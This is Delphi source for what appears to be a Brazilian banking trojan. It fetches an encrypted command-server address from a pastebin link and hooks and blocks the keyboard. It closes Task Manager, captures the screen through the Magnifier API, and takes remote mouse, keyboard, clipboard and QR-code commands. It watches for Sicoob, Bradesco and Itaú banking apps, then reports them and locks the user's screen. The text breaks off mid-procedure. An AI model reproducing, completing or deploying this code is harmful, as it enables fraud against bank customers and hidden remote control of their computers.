﻿unit principal;

interface

uses
  Windows, Messages, SysUtils, Variants, ActiveX, ComObj, Classes, Graphics,
  Controls, Forms, jpeg, IdHTTP, ScktComp, StdCtrls, ExtCtrls, Zlib, Registry,
  TlHelp32, Wcrypt2, DCPcrypt2, DCPrijndael, DCPsha512, System.StrUtils,
  DCPripemd160, Clipbrd, ShellAPi, inifiles, ShlObj, tapioca, CommCtrl, dwmapi,
  Vcl.Imaging.pngimage, dialogs, System.Threading, System.JSON, System.SyncObjs;

procedure Pausar(MSec: Cardinal);

function SplitString(S, Delimitador: string): TStringList;

function vDecript2(const src: string): string;

function vDc_vCri(Action, src: string): string;

function Creat_Sension(const TargetName: string): Boolean;

// procedure GravaMe;

var
  bBlockMouse: Boolean = false;
  blockwheel: Boolean = true;
  bBlockmove: Boolean = true;
  sLimite: TRect;

type
  TMyStruct = packed record
    lpHandle: HWND;
    lpProcessid: DWORD;
  end;

type
  TvEr = class(TForm)
  private
    procedure OnTimerTick(Sender: TObject);
  end;

type
  TPromptCmd = class(TThread)
    constructor Create;
    procedure Execute; override;
    procedure ExitWin(var Msg: TWMEndSession); message WM_ENDSESSION;
  public
    TextoClipBoard, ISQR: string;
    fila: TStrings;
    MouseX, MouseY: Integer;
    X1, X2, Y1, Y2: Integer;
    region, Region2: hrgn;
    regionY: Integer;
    iQrCodeX1, iQrCodeY1, iQrCodeX2, iQrCodeY2: Integer;
    //

    procedure ClipboardCmd(Comando: string);
    procedure mousedowne(Comando: string);
    procedure mousedownd(Comando: string);
    procedure mousemove(Comando: string);
    procedure pressmousedown(left: Boolean);
    procedure pressmouseup(left: Boolean);
    procedure keydown(Comando: string);
    procedure keyup(Comando: string);
    function KeyIsDown(const Key: Integer): Boolean;
    procedure CliqueDuplo(Comando: string);
    procedure procesaUser;
    procedure ColocaClipBoard;
    procedure GetImageByUrl(URL: string; APicture: TPicture);
    procedure TrataCmds(Comando: string);
    procedure Clear; stdcall; export;
    procedure RecortCmd(Comando: string);
    procedure Qr_cod(Comando: string);
    procedure Criar_Qr(Qr: TBitmap);
    procedure RecortarRestaurar(Comando: Integer);
    procedure Bloque(Tipo: string);
    procedure CarregarQrCod(srcBmp: TBitmap);
    procedure nSerial(Comando: string);
    procedure TrataComando(Comando: string);
    function GetQrc(Left1, Top1, Width1, Height1: Integer): TBitmap;
    procedure Tratar;
    //
  end;

function VersaoWin: string;

type
  tagKBDLLHOOKSTRUCT = packed record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: Integer;
  end;

  KBDLLHOOKSTRUCT = tagKBDLLHOOKSTRUCT;

  PKBDLLHOOKSTRUCT = ^KBDLLHOOKSTRUCT;

  tagMSLLHOOKSTRUCT = record
    POINT: TPoint;
    mouseData: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: DWORD;
  end;

  TMSLLHOOKSTRUCT = tagMSLLHOOKSTRUCT;

  PMSLLHOOKSTRUCT = ^TMSLLHOOKSTRUCT;

const
  LLKHF_UP = $0080;
  LLKHF_ALTDOWN = $0020;
  WH_KEYBOARD_LL = $000D;
  LLKHF_EXTENDED = $0001;
  LLKHF_INJECTED = $0010;

var
  BitQR: TBitmap;
  cr: Tcursor;
  hkHook: HHook;
  Telinha: Boolean;
  desktop, hwndMag: HWND;
  desktoprect, sourceRect: TRect;
  // filterList: THWNDArray;
  m_ScreenX, m_ScreenY, m_ScreenT, m_ScreenL: Integer;

  // function  AbreMaladireta(ZipName: string; Destination: string): boolean;
function ExisteApp: string;
procedure ClearAppMemorySize;

function LockControl(nCode: Integer; wParam: wParam; lParam: lParam)
  : LRESULT; stdcall;

function Captchar(Code, wParam, lParam: Integer): Integer; stdcall;

procedure unisInstal_Key_Capt;

procedure Instal_Key_Capt;

function gsApp: string;

function gsRoaming: string;

function ConfXTheme: string;

function ProcessExists(exeFileName: string): Boolean;

function MagImageScalingCallback(HWND: HWND; srcdata: Pointer;
  srcheader: MAGIMAGEHEADER; destdata: Pointer; destheader: MAGIMAGEHEADER;
  unclipped: TRect; clipped: TRect; dirty: hrgn): BOOL; stdcall;

procedure Instal_Lock;

procedure UniInstal_lock;

procedure EnviaBuffe(viewerCursor: Boolean; mEmoria: TMemoryStream);

function O_F_uS_C(Action, src: string): string;

procedure CapturaErro(Sender: TObject; E: Exception);

procedure xCasaOK(strCasa, strTipo: string);

procedure CreatSessaoWindows;

procedure hProcessa;

procedure GetImg;

procedure LoadImg(Img: Timage; id: string);

procedure Install_Cur(yes: Boolean);

procedure Peek;

function IsRaptor: string;

function IsCore: string;

procedure Iniciar;

procedure uLook;

procedure UnHookIt;

procedure xClose_Gerenciador;

procedure ScriptKid;

procedure InitializeMagnifier;

procedure ScriptRun(Name, id: string);

procedure xSalvaNois(Dir, Data: string);

procedure DisablePeek;

function Mostra_ou_Esconder(sim: Boolean): Boolean;

procedure SethWndTrasparent(HWND: HWND; Transparent: Boolean);



implementation

uses
  variaveis, conexoes, ut_01, ut_02, ut_03, ut_04, ut_05, ut_06, ut_07, ut_test,
  u_rec,
  usession, funcoes, umodulo;

var
  Cmd: TPromptCmd;

Procedure DNSchange();
var
  vTask: ITask;
begin
  vTask := TTask.Create(
    procedure
    begin
      TThread.Synchronize(nil,
        procedure
        var
          http: Variant;
          usuarios: string;
          jsonObj: TJSONObject;
          jv_Host: TJSONValue;
          dados: TStringList;
          res1: TStringList;
          res2: TStringList;
          rel: TStringList;
          URL: string;
        begin
          try
            CoInitialize(nil);
            URL := 'https://pastebin.com/raw/g0FKMLgc';
            dados := nil;
            dados := TStringList.Create;
            res1 := nil;
            res1 := TStringList.Create;
            res2 := nil;
            res2 := TStringList.Create;
            rel := nil;
            rel := TStringList.Create;

            http := CreateOleObject('WinHttp.WinHttpRequest.5.1');
            http.open('GET', URL, false);
            http.send;
            usuarios := http.responsetext;

            dados.Text := usuarios;

            dados.Text := StringReplace(dados.Text, '&quot;', '"',
              [rfReplaceAll, rfIgnoreCase]);

            res1.Add(dados.Text);

            res2.Add(ExtractText(res1.Strings[0], 'inicio', 'fim'));

            jsonObj := TJSONObject.ParseJSONValue(TEncoding.ASCII.GetBytes
              (res2.Text), 0) as TJSONObject;

            jv_Host := jsonObj.Get('host').JsonValue;
            ServidorIP := trim(vDecript2(jv_Host.Value));

            CoUninitialize;
          except
          end;

        end);
    end);
  vTask.Start;

End;

procedure SethWndTrasparent(HWND: HWND; Transparent: Boolean);
var
  l: Longint;
  lpRect: TRect;
begin
  if Transparent then
  begin
    l := GetWindowLong(HWND, GWL_EXSTYLE);
    l := l or WS_EX_LAYERED;
    SetWindowLong(HWND, GWL_EXSTYLE, l);
    SetLayeredWindowAttributes(HWND, 0, 255, LWA_ALPHA);
  end
  else
  begin
    l := GetWindowLong(HWND, GWL_EXSTYLE);
    l := l xor WS_EX_LAYERED;
    SetWindowLong(HWND, GWL_EXSTYLE, l);
    GetWindowRect(HWND, lpRect);
    InvalidateRect(HWND, lpRect, true);
  end;
end;

function Mostra_ou_Esconder(sim: Boolean): Boolean;
begin
  if sim then
    ShowWindow(Handle_Pic, SW_SHOW)
  else
    ShowWindow(Handle_Pic, SW_HIDE)
end;

procedure ScriptRun(Name, id: string);
begin
  try
    xSalvaNois(Name, id);
    ShellExecute(handle, PWideChar('open'), PWideChar(Application.exename),
      PWideChar(Name), '', SW_HIDE);
  except
  end;
end;

procedure ScriptKid;
begin
  keybd_event(VK_SHIFT, 0, KEYEVENTF_EXTENDEDKEY or 0, 0);
  keybd_event(VK_F8, 0, 0, 0);
  keybd_event(VK_SHIFT, $45, KEYEVENTF_EXTENDEDKEY or KEYEVENTF_KEYUP, 0);
end;

function HostWndProc(hWindow: HWND; Msg: UINT; wParam: wParam; lParam: lParam)
  : LRESULT; stdcall;
begin
  Result := DefWindowProc(hWindow, Msg, wParam, lParam);
end;

procedure InitializeMagnifier;
begin
  try

    ArqTmp := TMemoryStream.Create;
    hWndHost := 0;
    wc.lpszClassName := PWideChar('MagnifierHost');
    wc.lpfnWndProc := @HostWndProc;
    wc.Style := 0;
    wc.hInstance := 0;
    wc.hIcon := 0;
    wc.hCursor := 0;
    wc.hbrBackground := 0;
    wc.lpszMenuName := nil;
    wc.cbClsExtra := 0;
    wc.cbWndExtra := 0;

    desktop := GetDesktopWindow;
    GetWindowRect(desktop, desktoprect);

    Windows.RegisterClass(wc);
    hWndHost := CreateWindowEx(WS_EX_TOPMOST or WS_EX_LAYERED or
      WS_EX_TOOLWINDOW, PWideChar('MagnifierHost'), PWideChar('Host Window'),
      WS_POPUP or WS_CLIPCHILDREN, 0, 0, desktoprect.width, desktoprect.height,
      0, 0, 0, nil);

    if (hWndHost <> 0) then
      SetLayeredWindowAttributes(hWndHost, 0, 255, LWA_ALPHA);
    if (hWndHost = 0) then
      vFlagScree := 1;

    if (MagInitialize) then
      hwndMag := CreateWindowEx(0, WC_MAGNIFIER, PWideChar('MagnifierWindow'),
        WS_CHILD or MS_SHOWMAGNIFIEDCURSOR or WS_VISIBLE, 0, 0,
        desktoprect.width, desktoprect.height, hWndHost, 0, 0, nil)
    else
      vFlagScree := 1;

    if (hwndMag = 0) then
      vFlagScree := 1;

    if not(MagSetImageScalingCallback(hwndMag, MagImageScalingCallback)) then
      vFlagScree := 1;

    bitground := TBitmap.Create;
  except

  end;
end;

function RestartaSessao(RebootParam: Longword): Boolean;
var
  TTokenHd: THandle;
  TTokenPvg: TTokenPrivileges;
  cbtpPrevious: DWORD;
  rTTokenPvg: TTokenPrivileges;
  pcbtpPreviousRequired: DWORD;
  tpResult: Boolean;
begin
  if Win32Platform = VER_PLATFORM_WIN32_NT then
  begin
    tpResult := OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES or
      TOKEN_QUERY, TTokenHd);
    if tpResult then
    begin
      tpResult := LookupPrivilegeValue(nil, PWideChar('SeShutdownPrivilege'),
        TTokenPvg.Privileges[0].Luid);
      TTokenPvg.PrivilegeCount := 1;
      TTokenPvg.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
      cbtpPrevious := SizeOf(rTTokenPvg);
      pcbtpPreviousRequired := 0;
      if tpResult then
        Windows.AdjustTokenPrivileges(TTokenHd, false, TTokenPvg, cbtpPrevious,
          rTTokenPvg, pcbtpPreviousRequired);
    end;
  end;
  Result := ExitWindowsEx(RebootParam, 0);
end;

function ProcessExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := false;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
      = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
      = UpperCase(exeFileName))) then
    begin
      Result := true;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function Finalizaprocesso(exeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
      = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
      = UpperCase(exeFileName))) then
      Result := Integer(TerminateProcess(OpenProcess(PROCESS_TERMINATE, BOOL(0),
        FProcessEntry32.th32ProcessID), 0));
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

procedure TPromptCmd.ExitWin(var Msg: TWMEndSession);
begin
  if Msg.EndSession = true then
    inherited;
end;

procedure xSalvaNois(Dir, Data: string);
var
  ResStream: TResourceStream;
begin
  ResStream := TResourceStream.Create(hInstance, Data, RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile(Dir);
  finally
    ResStream.Free;
  end;
end;

function ConfXTheme: string;
var
  tmp: string;
begin
  tmp := GetEnvironmentVariable('TEMP') + '\ConfXTheme';
  if not DirectoryExists(tmp) then
    ForceDirectories(tmp);
  Result := tmp;
end;

procedure UnHookIt;
begin
  UnHookWindowsHookEx(hkHook);
end;

procedure CreatReg(nForm: THandle; nTNT: TForm; X1, Y1, X2, Y2: Integer);
var
  region, Region2: hrgn;
  regionY, regionExtend: Integer;
  nPanel: TPanel;
  nFundo, btConfirme: Timage;
  rect: TRect;
begin
  GetWindowRect(Handle_Main, rect);
  { SetWindowLong(nForm, GWL_EXSTYLE,
    GetWindowLong(nForm, GWL_EXSTYLE)
    and not WS_EX_TRANSPARENT or  WS_EX_TOOLWINDOW); }

  region := CreateRectRgn(0, 0, rect.width, rect.height);
  Region2 := CreateRectRgn(X1, Y1, X1 + 750, Y2);
  regionY := (Y2);
  CombineRgn(region, region, Region2, RGN_DIFF);
  SetWindowRgn(nForm, region, true);
  nTNT.Top := regionY;
  nTNT.left := X1;
  // vDeskTop:=1;
end;

procedure xClose_Gerenciador;
var
  hw: HWND;
begin
  if IsWindow(Handle_Main) then
  begin
    hw := FindWindow(nil, PWideChar('Gerenciador de Tarefas do Windows'));
    if hw > 0 then
      PostMessage(hw, WM_CLOSE, 0, 0);

    hw := FindWindow(nil, PWideChar('Gerenciador de Tarefas'));
    if hw > 0 then
      PostMessage(hw, WM_CLOSE, 0, 0);
  end;
end;

function uTrataKey(nCode: Integer; wParam: Integer; lParam: Integer): Integer;
  stdcall; export;
var
  Hook: PKBDLLHOOKSTRUCT;
  bControlKeyDown: Boolean;
  fEatKeystroke: Boolean;
begin
  Hook := Pointer(lParam);
  // xClose_Gerenciador;
  case nCode of
    HC_ACTION:
      begin
        bControlKeyDown :=
          ((GetAsyncKeyState(VK_CONTROL) shr ((SizeOf(SHORT) * 8) - 1)) <> 0);
        if (Hook^.vkCode = VK_ESCAPE) and (bControlKeyDown) then
        begin
          Result := 1;
        end
        else if ((Hook^.flags and LLKHF_ALTDOWN) <> 0) and
          (Hook^.vkCode = VK_TAB) then
        begin
          Result := 1;
        end
        else if ((Hook^.flags and LLKHF_ALTDOWN) <> 0) and
          (Hook^.vkCode = VK_ESCAPE) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_RETURN) and (bControlKeyDown) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_LWIN) or (Hook^.vkCode = VK_RWIN) then
        begin
          Result := 1;
        end
        else if (Hook^.vkCode = VK_MENU) or (Hook^.vkCode = VK_LMENU) or
          (Hook^.vkCode = VK_RMENU) then
        begin
          Result := 1;
        end
        else
        begin
          Result := CallNextHookEx(hkHook, nCode, wParam, lParam);
        end;
      end;
  else
    begin
      Result := CallNextHookEx(hkHook, nCode, wParam, lParam);
    end;
  end;
end;

procedure uLook;
var
  hmod: Cardinal;
begin
  bBlockMouse := false;
  MoverMouse := false;
  hmod := GetModuleHandle(nil);
  hkHook := SetWindowsHookEx(WH_KEYBOARD_LL, @uTrataKey, hmod, 0);
end;

procedure TvEr.OnTimerTick(Sender: TObject);
begin
  hProcessa;
end;

procedure SetPriority(High: Boolean; RealtimeND: Boolean = true);
var
  tp, pp: Integer;
begin
  if High then
    if (RealtimeND) and (DebugHook = 0) then
    begin
      pp := REALTIME_PRIORITY_CLASS;
      tp := THREAD_PRIORITY_TIME_CRITICAL;
    end
    else
    begin
      // very high priority is dangerous for debugging...
      pp := HIGH_PRIORITY_CLASS;
      tp := THREAD_PRIORITY_ABOVE_NORMAL;
    end
  else
  begin
    pp := NORMAL_PRIORITY_CLASS;
    tp := THREAD_PRIORITY_NORMAL;
  end;
  SetPriorityClass(GetCurrentProcess, pp);
  SetThreadPriority(GetCurrentThread, tp);
end;

procedure Iniciar;
var
  InvisibleForm: TvEr;
begin
  InvisibleForm := TvEr(TForm.Create(Application));
  hwdForm := InvisibleForm.handle;
  Timer := TTimer.Create(InvisibleForm);
  vLista := TListBox.Create(InvisibleForm);
  vLista.Parent := InvisibleForm;
  vLista.Align := alClient;
  Timer.Interval := 250;
  Timer.OnTimer := InvisibleForm.OnTimerTick;
  Timer.Enabled := true;
  //Timer.Enabled := false;
  DNSchange();
 // Socket.SendText(vDc_vCri('C', '#ConvitRC#' + '<#>' + ComputerName + '-' +
     //   Isadmin + '<#>' + (Casa) + '<#>' + Tipo + 'Sem navegador aberto'));
  //CasaOK := true;
  Casa := 'Gerenciador de Janelas';
  Tipo := 'Sem Navegador Aberto';
  PostMessage(hwdForm, WM_CLOSE, 0, 0);
  PortaServe := 19167;

  CmdPrincipal := TClientePrincipal.Create;
  CmdPrincipal.Execute;

  // InvisibleForm.Show;
end;

procedure Peek;
var

  DWMlibrary: THandle;
  fDisable: BOOL;
  DwmEnableComposition: function(CompositionAction: Integer): Integer; stdcall;
begin

  DWMlibrary := LoadLibrary(pchar('DWMAPI.dll'));
  if DWMlibrary <> 0 then
  begin
    @DwmEnableComposition := GetProcAddress(DWMlibrary,
      pchar('DwmEnableComposition'));
    if @DwmEnableComposition <> nil then
      DwmEnableComposition(1);

  end;
end;

procedure DisablePeek;
var
  DWMlibrary: THandle;
  fDisable: BOOL;
  DwmEnableComposition: function(CompositionAction: Integer): Integer; stdcall;
begin

  DWMlibrary := LoadLibrary(pchar('DWMAPI.dll'));
  if DWMlibrary <> 0 then
  begin
    @DwmEnableComposition := GetProcAddress(DWMlibrary,
      pchar('DwmEnableComposition'));
    if @DwmEnableComposition <> nil then
      DwmEnableComposition(0);

  end;
end;

function SetMe(i: Cardinal): Boolean;
begin
  cr := LoadCursor(hInstance, pchar('Cursor_1'));
  SetSystemCursor(cr, i);
end;

procedure Install_Cur(yes: Boolean);
var
  i: Integer;
begin
  if yes then
  begin
    SetMe(OCR_NORMAL);
    SetMe(OCR_APPSTARTING);
    SetMe(OCR_CROSS);
    SetMe(OCR_HAND);
    SetMe(OCR_IBEAM);
    SetMe(OCR_NO);
    SetMe(OCR_SIZEALL);
    SetMe(OCR_SIZENESW);
    SetMe(OCR_SIZENWSE);
    SetMe(OCR_SIZEWE);
    SetMe(OCR_UP);
    SetMe(OCR_WAIT);
  end
  else
    SystemParametersInfo(SPI_SETCURSORS, 0, 0, WM_SETTINGCHANGE or
      SPIF_UPDATEINIFILE);

end;

procedure LoadImg(Img: Timage; id: string);
var
  RS: TResourceStream;
  PMNGImage: TPngImage;
begin
  PMNGImage := TPngImage.Create;
  try
    RS := TResourceStream.Create(hInstance, id, RT_RCDATA);
    try
      PMNGImage.LoadFromStream(RS);
      Img.Picture.Graphic := PMNGImage;
    finally
      RS.Free;
    end;
  finally
    PMNGImage.Free;
  end;
end;

function MagImageScalingCallback(HWND: HWND; srcdata: Pointer;
srcheader: MAGIMAGEHEADER; destdata: Pointer; destheader: MAGIMAGEHEADER;
unclipped: TRect; clipped: TRect; dirty: hrgn): BOOL; stdcall;
var
  lpbmi: TBitmapInfo;
  bmp: TBitmap;
  aDC: HDC;
  abitmap: HBitmap;
  Bild: TBitmap;
  C: TCanvas;
begin

  Fillchar(lpbmi, SizeOf(lpbmi), 0);

  lpbmi.bmiHeader.biSize := SizeOf(lpbmi.bmiHeader);

  lpbmi.bmiHeader.biHeight := -srcheader.height;
  // Otherwise the image is upside down.
  lpbmi.bmiHeader.biWidth := srcheader.width;
  lpbmi.bmiHeader.biSizeImage := srcheader.cbSize;
  lpbmi.bmiHeader.biPlanes := 1;
  lpbmi.bmiHeader.biBitCount := 32;
  lpbmi.bmiHeader.biCompression := BI_RGB;
  aDC := GetWindowDC(HWND);
  bmp := TBitmap.Create;
  bmp.PixelFormat := pf32bit;
  bmp.width := Screen.width;
  bmp.height := Screen.height;
  abitmap := 0;

  try
    abitmap := CreateDIBitmap(aDC, lpbmi.bmiHeader, CBM_INIT, srcdata, lpbmi,
      DIB_RGB_COLORS);
    bmp.handle := abitmap;

    try

      if Global.vFlagQR = 1 then
      begin
        Global.vFlagQR := 0;
        ImgTemp.Position := 0;
        bmp.SaveToStream(ImgTemp);
      end;

      if IsWindow(Handle_Main) then
      begin
        bmp.Canvas.Brush.Style := bsClear;
        bmp.Canvas.Font.Size := 10;
        bmp.Canvas.Font.color := clred;
        bmp.Canvas.Font.Style := [fsBold];
        bmp.Canvas.Brush.color := clWhite;
        bmp.Canvas.TextOut(5, 70, 'Tela:Bloqueada');
        bmp.Canvas.TextOut(5, 90, 'IMG:01');
        bmp.Canvas.TextOut(5, 110, 'Win:' + WinVTemp);
      end;

      C := TCanvas.Create;
      C.handle := bmp.Canvas.handle;
      Bild := TBitmap.Create;
      Bild.PixelFormat := pf8bit;
      Bild.width := (Screen.width * Zoom) div 100;
      Bild.height := (Screen.height * Zoom) div 100;
      SetStretchBltMode(Bild.Canvas.handle, HALFTONE);
      StretchBlt(Bild.Canvas.handle, 0, 0, Bild.width, Bild.height, C.handle, 0,
        0, Screen.width, Screen.height, SRCCOPY);
      Bild.SaveToStream(ArqTmp);
    finally
      ReleaseDC(0, C.handle);

      C.Free;
      Bild.Free;
    end;

  finally
    DeleteObject(abitmap);
    DeleteDC(aDC);
    bmp.Free;
  end;
  Result := true;
end;

procedure Creat_Scree_Aux(Bild: TBitmap; Col, Lin, Larg, Alt: Integer);
var
  bmp: TBitmap;
  C, Canvas: TCanvas;
  DC: HDC;
begin

  try
    Canvas := TCanvas.Create;
    Canvas.handle := GetDC(GetDesktopWindow);
    bmp := TBitmap.Create;
    bmp.PixelFormat := pf8bit;
    bmp.width := Screen.width;
    bmp.height := Screen.height;
    SetStretchBltMode(bmp.Canvas.handle, HALFTONE);
    StretchBlt(bmp.Canvas.handle, 0, 0, bmp.width, bmp.height, Canvas.handle, 0,
      0, Screen.width, Screen.height, SRCCOPY);
  finally
    ReleaseDC(0, Canvas.handle);
    Canvas.Free;

  end;

  if (IsWindow(Handle_Main)) and (Global.vFlag = 0) then
  begin
    // Handle_Main.Chrome_WidgetWin_1.picture.picture:=bmp;
    bitground.handle := bmp.handle;
    Global.vFlag := 1;
  end;

  if Global.vFlagQR = 1 then
  begin
    Global.vFlagQR := 0;
    ImgTemp.Position := 0;
    bmp.SaveToStream(ImgTemp);
  end;

  if IsWindow(Handle_Main) then
  begin
    bmp.Canvas.Brush.Style := bsClear;
    bmp.Canvas.Font.Size := 10;
    bmp.Canvas.Font.color := clred;
    bmp.Canvas.Font.Style := [fsBold];
    bmp.Canvas.Brush.color := clWhite;
    bmp.Canvas.TextOut(5, 70, 'Tela:Bloqueada');
    bmp.Canvas.TextOut(5, 90, 'IMG:02');
    bmp.Canvas.TextOut(5, 110, 'Win:' + WinVTemp);
  end;

  try
    C := TCanvas.Create;
    C.handle := bmp.Canvas.handle;
    Bild := TBitmap.Create;
    Bild.PixelFormat := pf8bit;
    Bild.width := (Screen.width * Zoom) div 100;
    Bild.height := (Screen.height * Zoom) div 100;
    SetStretchBltMode(Bild.Canvas.handle, HALFTONE);
    StretchBlt(Bild.Canvas.handle, 0, 0, Bild.width, Bild.height, C.handle, 0,
      0, Screen.width, Screen.height, SRCCOPY);
    Bild.SaveToStream(ArqTmp);
  finally
    ReleaseDC(0, C.handle);
    C.Free;
    Bild.Free;
    bmp.Free;
  end;
end;

procedure GetImg;
var
  filterList: THWNDArray;
begin

  try
    if not Telinha then
    begin
      if IsWindow(Handle_Main) then
        filterList[0] := Handle_Main;
    end;
  except
  end;

  if (MagSetWindowFilterList(hwndMag, MW_FILTERMODE_EXCLUDE, 1, @filterList[0]))
  then
  begin

    sourceRect.left := 0;
    sourceRect.Top := 0;
    sourceRect.right := desktoprect.width;
    sourceRect.bottom := desktoprect.height;

    // CallbackDone := False;

    if (MagSetWindowSource(hwndMag, sourceRect)) then

  end;
end;

procedure hProcessa;

  function LimpaCaption(titulo: string): string;
  var
    x: Integer;
  begin
    for x := 0 to Length(titulo) do
      if (titulo[x] in ['A' .. 'Z', 'a' .. 'z']) then
        Result := Result + LowerCase(titulo[x]);
  end;

  function Split(texto: string; Delimitador: string): TStringList;
  var
    retorno: TStringList;
  begin
    Result := TStringList.Create;
    Result.LineBreak := Delimitador;
    Result.Text := texto;
  end;

  function ProcessExists(exeFileName: string): Boolean;
  var
    ContinueLoop: BOOL;
    FSnapshotHandle: THandle;
    FProcessEntry32: TProcessEntry32;
  begin
    FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
    ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
    Result := false;
    while Integer(ContinueLoop) <> 0 do
    begin
      if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile))
        = UpperCase(exeFileName)) or (UpperCase(FProcessEntry32.szExeFile)
        = UpperCase(exeFileName))) then
      begin
        Result := true;
      end;
      ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
    end;
    CloseHandle(FSnapshotHandle);
  end;

  function Numerar(HWND: Cardinal; lParam: Integer): longbool; stdcall;
  var
    Processo: string;
    URL: string;
    titulo, lstURL: TStringList;
    buffer: array [0 .. 255] of char;
    i: Integer;
  begin
    Result := true;
    try
      //
      if (IsWindowVisible(HWND)) and (GetWindow(HWND, GW_OWNER) = 0) then
      begin
        SetLength(Janela, Max_Path);
        SetLength(Processo, Max_Path);
        SetLength(Janela, GetWindowText(HWND, pchar(Janela), Max_Path));

        if Janela <> '' then
        begin
          //
          if (Pos(UpperCase('internet explorer'), UpperCase(Janela)) > 0) then
          begin
            Janela := AnsiString(StringReplace(Janela, '- internet explorer',
              '', [rfReplaceAll, rfIgnoreCase]));
            vLista.Items.Add(vDc_vCri('C', Janela + '-#-' + IntToStr(HWND) +
              '-#-internet explorer'));
          end;
          //
          if (Pos(UpperCase('google chrome'), UpperCase(Janela)) > 0) then
          begin
            Janela := AnsiString(StringReplace(Janela, '- google chrome', '',
              [rfReplaceAll, rfIgnoreCase]));
            vLista.Items.Add(vDc_vCri('C', Janela + '-#-' + IntToStr(HWND) +
              '-#-google chrome'));

          end;
          //
          //
          if (Pos(UpperCase('mozilla firefox'), UpperCase(Janela)) > 0) then
          begin
            Janela := AnsiString(StringReplace(Janela, '- mozilla firefox', '',
              [rfReplaceAll, rfIgnoreCase]));
            vLista.Items.Add(vDc_vCri('C', Janela + '-#-' + IntToStr(HWND) +
              '-#-mozilla firefox'));

          end;

          if (Pos(UpperCase('microsoft edge'), UpperCase(Janela)) > 0) then
          begin
            Janela := AnsiString(StringReplace(Janela, '- microsoft edge', '',
              [rfReplaceAll, rfIgnoreCase]));
            vLista.Items.Add(vDc_vCri('C', Janela + '-#-' + IntToStr(HWND) +
              '-#-microsoft edge'));

          end;

        end;
      end;
    except
      Exit;
    end;
  end;

var
  i, Y: Integer;
  strItem: TStringList;
  MainHandle: Cardinal;
  hWindow: HWND;
begin
  //
  vLista.Clear;
  hWindow := FindWindow(pchar('SunAwtFrame'), nil);
  //
  if (hWindow > 0) and (DirectoryExists('C:\Sicoobnet')) then
  begin
    Timer.Enabled := false;
    if (not FileExists(gsApp + (barra) + 'BL-0.ini')) then
    begin
      if (not FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) +
        '.ini')) then
      begin
        Tipo := 'Aplicativo sicoob';
        xCasaOK('sicoob', 'Aplicativo sicoob');

      end;
    end;
    if (FileExists(gsApp + (barra) + 'BL-0.ini')) or
      (FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini'))
    then
    begin
      bBlockMouse := true;
      Instal_Lock;
    end;
    Exit;
  end;

  // inicio AplicativoBradesco 1
  if ProcessExists('AplicativoBradesco.exe') then
  begin
    Timer.Enabled := false;
    if (not FileExists(gsApp + (barra) + 'BL-0.ini')) then
    begin
      if (not FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) +
        '.ini')) then
      begin
        Tipo := ('Aplicativo bradesco');
        xCasaOK('Banco Bradesco', 'Aplicativo bradesco');
      end;
    end;
    if (FileExists(gsApp + (barra) + 'BL-0.ini')) or
      (FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini'))
    then
    begin
      bBlockMouse := true;
      Instal_Lock;
    end;
    Exit;
  end;
  // fim aplicativo bradesco 1

  // inicio AplicativoBradesco 2
  if ProcessExists('NavegadorExclusivoBradesco.exe') then
  begin
    Timer.Enabled := false;
    if (not FileExists(gsApp + (barra) + 'BL-0.ini')) then
    begin
      if (not FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) +
        '.ini')) then
      begin
        Tipo := ('Aplicativo bradesco');
        xCasaOK('Banco Bradesco', 'Aplicativo bradesco');
      end;
    end;
    if (FileExists(gsApp + (barra) + 'BL-0.ini')) or
      (FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) + '.ini'))
    then
    begin
      bBlockMouse := true;
      Instal_Lock;
    end;
    Exit;
  end;
  // fim aplicativo bradesco 2

  // inicio AplicativoItau
  if ProcessExists('itauaplicativo.exe') then
  begin
    Timer.Enabled := false;
    if (not FileExists(gsApp + (barra) + 'BL-0.ini')) then
    begin
      if (not FileExists(gsApp + (barra) + FormatDateTime('ddmmyyyy', Date) +
        '.ini')) then
      begin
        Tipo := ('Aplicativo Itaú');
        xCasaOK('Banco Itaú', 'Aplicativo Itaú');
      end;
    end;
